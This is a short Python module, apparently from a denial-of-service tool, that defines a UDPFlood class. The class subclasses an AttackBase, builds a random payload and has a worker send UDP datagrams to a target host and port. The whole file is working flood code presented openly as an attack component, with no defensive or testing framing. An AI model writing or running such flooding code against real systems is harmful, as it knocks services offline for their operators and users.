import socket
import random
from .base import AttackBase

class UDPFlood(AttackBase):
    def __init__(self, *args, payload_size=1024, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload = random._urandom(payload_size)

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(self.payload, (self.target, self.port))
            return len(self.payload)
        finally:
            sock.close()
